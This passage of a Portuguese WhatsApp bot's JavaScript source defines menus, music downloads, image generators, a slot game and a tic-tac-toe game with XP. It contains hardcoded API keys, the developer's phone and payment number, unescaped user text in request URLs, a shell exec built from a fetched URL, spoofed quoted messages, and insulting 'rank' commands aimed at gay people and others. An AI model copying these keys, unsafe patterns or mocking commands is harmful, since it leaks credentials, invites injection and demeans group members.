┃┃ঔৣ͜͡➳ *.tttrank* ( seu rank no jogo da velha)
┃┃ঔৣ͜͡➳ *.pau* 
┃┃ঔৣ͜͡➳ *.casal ou .pombinhos*
┃┃ঔৣ͜͡➳ *.gostosas*
┃┃ঔৣ͜͡➳ *.punheteros*
┃┃ঔৣ͜͡➳ *.rankgados*
┃┃ঔৣ͜͡➳ *.rankgays*
┃┃ঔৣ͜͡➳ *.rankcacos*
┃┃ঔৣ͜͡➳ *.ranknazistas*
┃┃ঔৣ͜͡➳ *.rankgostosos*
┃┃ঔৣ͜͡➳ *.rankgostosas*
┃┃ঔৣ͜͡➳ *.ranklindos*
┃┃ঔৣ͜͡➳ *.ranklindas*
┃┃ঔৣ͜͡➳ *.rankfeias*
┃┃ঔৣ͜͡➳ *.rankfeios*
┃┗━━━━━━━━━━━━
┗━━━〘  *outros* 〙
┃┏━━━━━━━━━━━━
┃┃ঔৣ͜͡➳ *.rr* (roleta russa)
┃┃ঔৣ͜͡➳ *.roleta*
┃┃ঔৣ͜͡➳ *.cassino*
┃┃ঔৣ͜͡➳ *.cassinovip* 
┃┃ঔৣ͜͡➳ *.cc ou .caracoroa*
┃┃ঔৣ͜͡➳ *.dado*
┃┃ঔৣ͜͡➳ *dadovip* 
┃         🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ Domina$
┗━━━━━━━━━━━━━━`

Pin.sendMessage(from, hasil , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Menu jogos️", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

      break      
      
      


      
case 'menu10':
case 'menumotivaçao':
menubotu = ["As pessoas costumam dizer que a motivação não dura sempre. Bem, nem o efeito do banho, por isso recomenda-se diariamente.", "Motivação é a arte de fazer as pessoas fazerem o que você quer que elas façam porque elas o querem fazer.","Toda ação humana, quer se torne positiva ou negativa, precisa depender de motivação.","Lute com determinação, abrace a vida com paixão, perca com classe e vença com ousadia, porque o mundo pertence a quem se atreve e a vida é muito para ser insignificante.","No meio da dificuldade encontra-se a oportunidade.","Pedras no caminho? Eu guardo todas. Um dia vou construir um castelo.","É parte da cura o desejo de ser curado","Tudo o que um sonho precisa para ser realizado é alguém que acredite que ele possa ser realizado.","O que me preocupa não é o grito dos maus. É o silêncio dos bons.","Quando você quer alguma coisa, todo o universo conspira para que você realize o seu desejo.","Imagine uma nova história para sua vida e acredite nela."]
menu90 = menubotu[Math.floor(Math.random() * menubotu.length)]     

hasil = `✨ Menu motivacional ✨

Sua frase motivacional é : *${menu90}*
`
Pin.sendMessage(from, hasil , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Menu️ motivação", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

break 




case 'menu9':
case 'menujunhin':


hasil = ` Menu do junhin rsrsrs

*meu pix >\\\<*
55 71 99258-3596

*minha wa.me :D*
wa.me/557187566648

*meu insta ^-^*
@eojunhink7_

meu canal ♡
https://youtube.com/channel/UCow-1uDn63peoG41B7intjw

   *𝙇𝙞𝙣𝙠 𝙙𝙤 𝙘𝙝𝙖𝙩 𝙙𝙤 𝙟𝙪𝙣𝙝𝙞𝙣*
⇲    
     https://chat.whatsapp.com/GaxOW8aZxAeCP5xJrBhBTq
────────────────
 *𝙇𝙞𝙣𝙠 𝙙𝙤 𝙘𝙝𝙖𝙩 𝙙𝙤 𝙟𝙪𝙣𝙝𝙞𝙣 [ 2 ]*
⇲    
     https://chat.whatsapp.com/D7LAWs0rRUR8Yr09KfLs72
────────────────
 *𝙇𝙞𝙣𝙠 𝙙𝙤 𝙘𝙝𝙖𝙩 𝙙𝙤 𝙟𝙪𝙣𝙝𝙞𝙣 [ 3 ]*
⇲    
     https://chat.whatsapp.com/C3ZPDQYwTB0GacJrVgskbM
     
obrigado por existir, se poder dar uma força agradeço tmj lhek ♡
`
Pin.sendMessage(from, hasil , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Menu️ junhinkkkk", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

break


  
//---velocidade da resposta

case 'ping':

  case 'speed':

if (!isRegister) return reply(mess.only.userB)

const timestamp = speed();

const latensi = speed() - timestamp

Pin.updatePresence(from, Presence.composing)

uptime = process.uptime()

Pin.sendMessage(from, `*𝐕𝐄𝐋𝐎𝐂𝐈𝐃𝐀𝐃𝐄 𝐃𝐄 𝐑𝐄𝐒𝐏𝐎𝐒𝐓𝐀 𝐃𝐎 𝐁𝐎𝐓*\n‣ *𝐕𝐄𝐋𝐎𝐂𝐈𝐃𝐀𝐃𝐄* : ${latensi.toFixed(4)} _𝐒𝐄𝐆𝐔𝐍𝐃𝐎_\n\n‣ *𝐈𝐌𝐅𝐎 𝐃𝐎 𝐁𝐎𝐓*\n‣ *𝐓𝐎𝐓𝐀𝐋 𝐂𝐇𝐀𝐓 𝐃𝐎 𝐁𝐎𝐓* : ${totalchat.length}\n‣ *𝐓𝐎𝐓𝐀𝐋 𝐃𝐄 𝐔𝐒𝐒𝐔𝐀𝐑𝐈𝐎* : ${_registered.length}\n‣ *𝐁𝐋𝐎𝐂𝐊* : ${blocked.length}\n‣ *𝐎𝐍𝐋𝐈𝐍𝐄* : ${kyun(uptime)}`, text, {

  quoted: mek

})

break



//-- personagens de anime
					
					
case 'hinata':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Hinata`, {method: 'get'})
					hina = JSON.parse(JSON.stringify(anu));
					ta =  hina[Math.floor(Math.random() * hina.length)];
					nye = await getBuffer(ta)
					Pin.sendMessage(from, nye, image, { caption: 'hinata!!', quoted: mek })
					await limitAdd(sender)
					break
					
					
					
					
					
					
case 'sasuke':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=sasuke`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() * sasu.length)];
					nye = await getBuffer(ke)
					Pin.sendMessage(from, nye, image, { caption: 'sasuke!!', quoted: mek })
					await limitAdd(sender) 
					break
					
					
					
					
					
case 'sakura':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=sakura`, {method: 'get'})
					sak = JSON.parse(JSON.stringify(anu));
					kura =  sak[Math.floor(Math.random() * sak.length)];
					nye = await getBuffer(kura)
					Pin.sendMessage(from, nye, image, { caption: 'sakura!!', quoted: mek })
					await limitAdd(sender) 
					break
					
					
					
//-- youtube é plays					
					
case 'gay1': 
                                        var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                                         reply(mess.wait)
                                         owgi = await  Pin.downloadAndSaveMediaMessage(ger)
                                         anu = await imgbb("727e7e43f6cda1dfb85d888522fd4ce1", owgi)
                                        teks = `${anu.display_url}`
                                        ranp = getRandom('.png')
                                        rano = getRandom('.webp')
                                        anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
                                         exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                         if (err) return reply(mess.error.stick)
                                                nobg = fs.readFileSync(rano)
                                                 Pin.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Use a foto!')
                                          }
                   break
                   
                   
	
case 'ytplay':
                if (args.length < 1) return reply(`qual título mano?\nexemplo : ${prefix + command} Teto Paypal`)
                reply('Procurando sua música...⏳')
                query = args.join(' ')
                get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=8cedf7d9513db18b1c7571ac&query=${query}`)
                get_result = get_result.result
                get_info = get_result.info
                ini_txt = `Titulo : ${get_info.title}\n`
                ini_txt += `Uploader : ${get_info.uploader}\n`
                ini_txt += `Duration : ${get_info.duration}\n`
                ini_txt += `View : ${get_info.view}\n`
                ini_txt += `Like : ${get_info.like}\n`
                ini_txt += `Dislike : ${get_info.dislike}\n`
                ini_txt += `Description :\n ${get_info.description}\n\n\n`
                ini_buffer = await getBuffer(get_info.thumbnail)
                Pin.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                get_audio = await getBuffer(get_result.audio[3].link)
                Pin.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_info.title}.mp3`, quoted: mek})
                get_video = await getBuffer(get_result.video[0].link)
                Pin.sendMessage(from, get_video, video, { mimetype: 'video/mp4', filename: `${get_info.title}.mp4`, quoted: mek})
                break			
case 'play':   
					if (args.length < 1) return reply(`Exemplo : ${p}play Paypal`)	
					apykeybysayo = 'Skillerofc'  //CONSIGA SUA KEY NESSE SITE = https://api.zeks.xyz/api
					reply("espere") 				 
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=${apykeybysayo}&q=${body.slice(5)}`)
				if (anu.error) return reply(anu.error)
				infomp3 = `𝐂𝐨𝐧𝐭𝐚 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐚\n❗MUSÍCA ENCONTRADA\n[❗] enviando sua música aguarde..`				
			    buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=JUNHIN-BOT&capa=${anu.result.thumbnail}`)
				Pin.sendMessage(from, buffer, image, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})					
                msc = await getBuffer(anu.result.url_audio)				
				Pin.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `private-bot.mp3`, quoted: mek })
				break                		
case 'play2':
                reply(mess.wait)
                play = body.slice(6)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=apivinz`)
               if (anu.error) return reply(anu.error)
                 infomp3 = `*MUSICA ENCONTRADA!!!*\nTítulo : ${anu.result.title}\nUrl : ${anu.result.source}\nTamanho : ${anu.result.size}\n\n*ESPERE UM POUQUINHO, N SPAME O CHAT*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                Pin.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                Pin.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                await limitAdd(sender)
                break
		
//-- outras funções


case 'aluguel':
                    const menu10 = fs.readFileSync('./src/menu/menu1.jpeg');
                    const menu20 = fs.readFileSync('./src/menu/menu2.jpeg');
                    const menu30 = fs.readFileSync('./src/menu/menu3.jpeg');
                    const menu40 = fs.readFileSync('./src/menu/menu4.jpeg');
                    const menu50 = fs.readFileSync('./src/menu/menu5.jpeg');
                    menu60 = ["menu1", "menu2","menu3","menu4","menu5"]
                    menu70 = menu60[Math.floor(Math.random() * menu60.length)]
                    menu80 = fs.readFileSync('./src/menu/'+menu70+'.jpeg')
                    Pin.sendMessage(from, menu80 , image, {quoted: mek, caption: aluguel(prefix) })
                    break
                 
                                             

case 'cassinovip':

		const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔',
		'🍒 : 🍒 : 🍒',
		'🍌 : 🍌 : 🍌'
		]
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
	yow = `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nInformaçoes : Se você pegar 3 iguais significa que você ganhou\n\nExemplo : 🍌 : 🍌 : 🍌<=====`
            reply(yow)
	
case 'covidbr':
 susi = await fetchJson(`https://api-gdr2.herokuapp.com/api/covidbr`)
  florr = await getBuffer(`http://www.treslagoas.ms.gov.br/wp-content/uploads/coronavirus-Catraca-Livre-420x280_c.jpg`)
  claa = `        ✘ *_COVID BRASIL_* ✘\n
➥Total de Casos: ${susi.result.totalCasos}
➥Novos Casos: ${susi.result.novosCasos}
➥Total de Mortos: ${susi.result.totalMortes}
➥Novos Mortos: ${susi.result.novasMortes}
➥Recuperados: ${susi.result.recuperados}
➥Vacinados: ${susi.result.vacinadosPrimeiraDose}
➥Atualizado: ${susi.result.dadosAtualizados}
➥CRD: JUNHIN`
  Pin.sendMessage(from, florr, image, {quoted: mek, caption: claa})
  break  


case 'traduzir':
 if (args.length < 1) return reply('Insira o texto que você deseja traduzir')
 Pin.updatePresence(from, Presence.composing)
 tels = body.slice(10)
 try {
 anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/translate?text=${tels}&from=id&to=pt`, {
 method: 'get'
  })
 reply(anu.translated_text)
 } catch {
 reply(mess.ferr)
 }
break 

 
case 'happymod':
anu = await fetchJson(`https://api.zeks.xyz/api/happymod?apikey=SUA KEY&q=${body.slice(10)}`, {method: 'get'})
teks = `*JUNHIN BOT* 𝗦𝗲𝗮𝗿𝗰𝗵\n`
for (let i of anu.result) {
teks += `Nome : ${i.title}
Classificação: ${i.rating}
Url : ${i.url}\n\n*JUNHIN BOT*
`
}
reply(teks.trim())
break                     
case 'alerta':
				 data = fs.readFileSync('./src/alerta.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                Pin.sendMessage(from, hasil, image, { quoted: mek, caption: 'alerta :v'})
				break                  


// inicio jogo da velha e leveling
case 'level':
					if (!isLevelingOn) return reply(mess.levelnoton)
					if (!isGroup) return reply(mess.only.group)
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
					sem = sender.replace('@s.whatsapp.net','')
					resul = `┏━━☯️ *LEVEL* ☯️━━\nঔৣ͜͡➳ Nome : ${pushname2}\nঔৣ͜͡➳ Seu XP :  ${userXp}\nঔৣ͜͡➳ Seu Level : ${userLevel}\n┗━━━━━━━━━━━━`
					Pin.sendMessage(from, resul, text, { quoted: mek})
					.catch(async (err) => {
                    console.error(err)
                    await reply(`Error!\n${err}`)
                    })
                    break
                case 'leveling':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('algo de errado nn está certo :𝘃')
					if (args[0] === 'on') {
                    if (isLevelingOn) return reply('*O comando de level já estava ativo*')
                    _leveling.push(groupId)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(mess.levelon)
					} else if (args[0] === 'off') {
                    _leveling.splice(groupId, 1)
                    fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                     reply(mess.leveloff)
					} else {
					reply(' Use ${prefix}leveling on para ativar e  ${prefix}leveling off para desativar')
					}
					break
case 'menu3':					
case 'ttthelp':
		Pin.sendMessage(from, ttthelp(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Jogo da velha", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})					
                break
case 'ttt':
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "on") {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.waitingTime == "on") {
reply(`Alguém jogou recentemente\nPor favor aguarde o tempo de espera...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
reply(`Defina a dificuldade\nEx.: ${prefix}ttt easy\n\nDificuldades: easy, normal, hard e impossible`)
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = mek
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
costum(`O jogo começou!!!\nModo: ${tttset.tttdifficulty} use ${prefix}ttthelp caso não saiba jogar`, text, tescuk, crtt)
Pin.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
Pin.sendMessage(from,`Bom jogo`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 240000) // 4 minutos
}
break	
case 'tttme':
if (!isGroup) return reply(ptbr.group())
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
Pin.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:mek})
break	
case 'tttrank':
if (!isGroup) return reply(ptbr.group())
//if (tictactoe.length < 3) return reply(`Humm, é necessário que no mínimo 3 pessoas tenham jogado...`)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '【 TTT RANKS 】\n\n'
try {
for (let i = 0; i < 3; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
}
mentioned_jid.push(tictactoe[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await Pin.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: mek})
}
break	
case 'coord' :
tttset.playertest = sender
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "off") {
reply(`Você ainda não iniciou o jogo\nDigite ${prefix}ttt [DIFICULDADE] para iniciar`)
} else if (tttset.player != tttset.playertest) {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.tttantibug == "on") {
reply(`Aguarde a ação anterior ser concluída...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
reply(`Digite o comando com uma coordenada\nExemplo: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a2':
if (esp.a2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a3':
if (esp.a3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b1':
if (esp.b1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b2':
if (esp.b2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b3':
if (esp.b3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c1':
if (esp.c1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c2':
if (esp.c2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c3':
if (esp.c3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
}
tttset.reActivate1 = "on"
reply(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP)
break
}
Pin.sendMessage(from, `🎉🎉 VITÓRIA DO MACACO 🎉🎉\n\n➣  RECOMPENSA: +${randomTTTXP} XP 🔮`, text)
} else {
Pin.sendMessage(from, `🎉🎉 VITÓRIA DO MACACO 🎉🎉`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0
addLevelingXp(tttset.player, randomTTTXP)
break
}	
Pin.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉\n\n➣  PUNIÇÃO: ${randomTTTXP} XP 🔮`, text)
} else {
Pin.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isCmd) {
Pin.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣  NÃO HÁ GANHOS NEM PERDAS`, text)
} else {
Pin.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break
//fim jogo da velha									
// funçoes extras

                case 'join':
				if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('You are burro? kd o link certo prr')
Pin.query({json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]})
reply('Entrei.')
break

                
                case 'blackpink':              
                case 'holographic':
                case 'text1917':               
                case 'bloodfrosted':          
				reply(mess.wait)
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} Junhin`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=b170074ac846042f35937286&text=${ini_txt}`)
                    Pin.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                    
                case 'halloween':              
				reply(mess.wait)
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} Junhin`)
                    teks = body.slice(10)
                    ini_buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome/halloween?apikey=846ddd27170a3a3caf903170&text=${teks}`)
                    Pin.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break    
                    
case 'monica':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					reply('*Estou fazendo... *')
					buffer = await getBuffer(`https://rsymenti.sirv.com/images%20(1).jpeg?text.0.text=${teks}&text.0.position.gravity=south&text.0.position.x=20%25&text.0.position.y=-68%25&text.0.size=45&text.0.color=000000&text.0.opacity=94&text.0.background.opacity=93&text.0.outline.blur=28&text.0.outline.opacity=37`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '✓'})
					break
					
case 'bolsonaro':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					reply('*Estou fazendo... *')
					buffer = await getBuffer(`https://rsymenti.sirv.com/1626624476633.jpg?text.0.text=${teks}&text.0.position.x=-13%25&text.0.position.y=-52%25&text.0.size=55&text.0.color=000000&text.0.background.opacity=100`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '✓'})
					break
										
					                    
case 'hub':
if (isBanned) return reply(mess.only.benned)
			    nobg = `${body.slice(4)}`

